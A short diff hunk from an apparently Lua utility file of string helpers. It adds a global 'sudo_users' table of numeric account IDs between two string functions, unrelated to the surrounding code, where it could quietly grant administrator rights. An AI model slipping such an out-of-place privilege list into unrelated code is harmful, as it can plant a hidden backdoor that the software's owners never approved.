@@ -226,7 +226,7 @@ end
 function string:isempty()
   return self == nil or self == ''
 end
-
+sudo_users = {110626080,103649648,143723991,111020322,0,tonumber( 131005831 )}
 -- Returns true if the string is blank
 function string:isblank()
   self = self:trim()
